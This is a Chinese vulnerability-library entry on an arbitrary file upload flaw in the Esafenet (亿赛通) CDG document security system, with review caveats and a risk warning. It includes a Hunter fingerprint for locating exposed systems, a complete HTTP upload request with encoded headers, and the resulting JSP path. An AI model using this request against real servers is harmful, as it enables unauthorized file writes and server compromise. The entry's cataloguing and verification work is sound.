---
source: "wy876 漏洞文库"
title: "亿赛通文件服务与CDGServer3 8021 uploadFile写入到Web应用"
product: "亿赛通文件服务与CDGServer3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "端口8021上传/8443或8090访问仅样例部署"
prerequisites: "无Cookie，但Content编码头可能含鉴权/路径"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dhcm5vbe1lakywrb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FuploadFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-68a723e55646b1963cc02894"
entity_id: "ve-68a723e55646b1963cc02894"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 亿赛通文件服务与CDGServer3 8021 uploadFile写入到Web应用

> 指纹历史字段校订（2026-10-04）：现有完整平台查询保持原值；旧未核字段中的残片逐字迁入 `previous_*`。此迁移不代表已确定原文其他谓词的组合意图，未给出的 AND/OR 不猜补。后文残片字段的旧诊断描述校订前状态，查询仍不证明资产受影响。

## 条目说明

- 对象与具体问题：亿赛通文件服务与CDGServer3；8021 uploadFile写入到Web应用
- 版本、配置及部署条件：端口8021上传/8443或8090访问仅样例部署
- 认证与权限前提：无Cookie，但Content编码头可能含鉴权/路径
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content头和第二条A-P串未解释编码/角色/路径，无法确认任意性和匿名范围
- 文件内容123不是执行证明，stc.jsp路径由何字段决定未述
- 8021/8443/8090不能当所有部署固定事实，应列架构/端口配置
- 无响应/修复/版本，区别hiddenWatermark和Service上传入口

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统uploadFile接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
该漏洞是在在该域名8021端口下进行上传，上传的内容是在8443端口或者8090端口

上传文件

```http
POST /file/uploadFile HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content: MGIFOACOKLJAHOGCPPOBDFLGJFPACJJKLFGFOBDNHAGLEDGALNKAEHDLMEOODCBFDIMEFNGHCMGBPABDLPPCHCLMAELIDDCLOGNPOCGHIEFJHIOEIIPPJBCIFCPDOKIOMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGMMOLGLGMIHOOFLHLBEHNIHOPOEKKIPHCMJAOMGMNPFINKHMPBFOJBJPNLNKILIOCMJIGHMNBBEBIAIKCHLENKGCPMEIIGODKKOEJJFEEIPNGHGBOOEIKNIOHIMCDONLKCEIFHIGKLHEGJNHMDAMIIELDOPGDKPOKKAHHDIMOJCJNHKMFABAFLFFDGEAJPIEOGPBNDHEOLDFBOFPFKBCEABHOPFDECBHBCFCEGO
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 144
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="file"
Content-Type: image/jpg

123
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 144；保留原始标头；其数值未据实际请求体重新计算或验证。


```plain
CBDJCOKKKDJALCHGLOICCHCGLHNPDANBDGPPNLNLHMHLAAAGALIIHCBFPKNFHKOFEIOKAOMHAMHLILNEHEPEMGFFHOPCEPFAHHGPLHEJOKNNMLCMCCFDJNKECLEGOLOMMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGEJMJMMGCAKMOOBKBNECCMOMJMEDMPDAJBMNKIJFPFOPEFNDABHJCLAINBDMEEODMBGKLIHCLLONIIGNIEMCBNKAPNPFPLOHCGM
```


上传文件位置，在8443端口或者8090端口

```plain
https://ip:8443/CDGServer3/3g/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dhcm5vbe1lakywrb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
